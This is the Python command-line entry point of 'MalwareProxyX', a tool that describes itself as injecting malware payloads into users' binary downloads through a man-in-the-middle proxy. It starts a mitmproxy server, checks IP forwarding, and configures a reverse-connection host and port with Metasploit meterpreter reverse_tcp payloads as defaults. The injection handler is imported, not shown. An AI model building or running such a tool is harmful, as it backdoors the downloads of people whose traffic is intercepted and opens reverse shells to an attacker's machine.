#!/usr/bin/env python

#  Copyright (c) 2021 - Darsh Patel
#  All rights reserved.
#  Redistribution and use in source and binary forms, with or without modification,
#  are permitted provided that the following conditions are met:
#      1. Redistributions of source code must retain the above copyright notice,
#      this list of conditions and the following disclaimer.
#      2. Redistributions in binary form must reproduce the above copyright notice,
#      this list of conditions and the following disclaimer in the documentation
#      and/or other materials provided with the distribution.
#      3. Neither the name of the copyright holder nor the names of its contributors
#      may be used to endorse or promote products derived from this software without
#      specific prior written permission.
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
#  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
#  ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
#  LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
#  CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
#  SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
#  INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
#  CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
#  ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
#  POSSIBILITY OF SUCH DAMAGE.

from MalwareProxyX.networking import TrafficHandler, ProxyMaster
from MalwareProxyX.version import __version__

try:
    from mitmproxy.options import Options
    from mitmproxy.proxy.config import ProxyConfig
    from mitmproxy.proxy.server import ProxyServer
except ImportError:
    raise ImportError('mitmproxy isn\'t installed. You must install mitmproxy. '
                      'Ideally run the setup scripts again')

import os
import logging
import sys
import subprocess
import argparse

logger = logging.getLogger('MalwareProxyX')
logging.basicConfig(level=logging.INFO)


class MalwareProxyX:
    def __init__(self, options):
        self.logger = logger
        self.logger.info("Initializing MalwareProxyX")
        self.pre_run_checks()
        self.proxy_options = self.generate_proxy_options(options)
        self.master = ProxyMaster(self.proxy_options, with_termlog=False,
                                  with_dumper=False)
        self.master.server = ProxyServer(ProxyConfig(self.proxy_options))
        self.master.addons.add(TrafficHandler(options))
        self.master.run()

    def pre_run_checks(self) -> None:
        self.logger.info("Running Pre Run Checks")
        if os.name == 'nt':
            self.logger.warning("Windows isn't currently supported")
            sys.exit(1)

        self.logger.info("Verifying IP Forwarding Support")
        try:
            if sys.platform == "darwin":
                if '0' in subprocess.check_output(["sysctl", "net.inet.ip.forwarding"],
                                                  encoding="UTF-8").strip():
                    self.logger.warning(
                        "net.inet.ip.forwarding is not enabled \n Use: sysctl "
                        "net.inet.ip.forwarding=1 to enable it")
                    sys.exit(1)
            elif sys.platform.startswith("linux"):
                if subprocess.check_output(["cat", "/proc/sys/net/ipv4/ip_forward"],
                                           encoding="UTF-8").strip() != "1":
                    self.logger.warning(
                        "ip forwarding is not enabled \n Use: echo 1 > "
                        "/proc/sys/net/ipv4/ip_forward to enable it")
                    sys.exit(1)
        except Exception as e:
            self.logger.exception(e)
            sys.exit(1)

    @staticmethod
    def generate_proxy_options(config) -> Options:
        return Options(listen_host=config.get('host'),
                       listen_port=config.get('port'),
                       http2=True,
                       mode='regular')

    @staticmethod
    def get_parser() -> argparse.ArgumentParser:
        parser = argparse.ArgumentParser(
            formatter_class=argparse.ArgumentDefaultsHelpFormatter,
            description='Real Time Malware Payload Injection In User Binary Downloads '
                        'Utilising MITM Proxy')
        parser.add_argument('-v', '--version',
                            help='displays the current version of MalwareProxyX',
                            action='store_true')
        parser.add_argument('--host',
                            dest='host',
                            type=str, default='0.0.0.0',
                            help='Host address server should bind to')
        parser.add_argument('--port',
                            dest='port',
                            type=int, default=8080,
                            help='The port server should bind to')
        parser.add_argument('--payload_port',
                            dest='payload_port',
                            type=int, default=4444,
                            help='The port used for reverse connection from payload')
        parser.add_argument('--payload_host',
                            dest='payload_host',
                            type=str, required=True,
                            help='The host used for reverse connection from payload')
        parser.add_argument('--payload_win32',
                            dest='payload_win32',
                            type=str, default='windows/meterpreter/reverse_tcp',
                            help='metasploit payload for x86 Binaries')
        parser.add_argument('--payload_win64',
                            dest='payload_win64',
                            type=str, default='windows/x64/meterpreter/reverse_tcp',
                            help='metasploit payload for x64 Binaries')
        return parser


def cli():
    parser = MalwareProxyX.get_parser()
    args = vars(parser.parse_args())

    if args['version']:
        print(f"MalwareProxyX Version: {__version__}")
        return

    if not args['port'] or not args['host']:
        print("Error: Missing Arguments")
        parser.print_usage()
        return

    MalwareProxyX(args)


if __name__ == "__main__":
    cli()
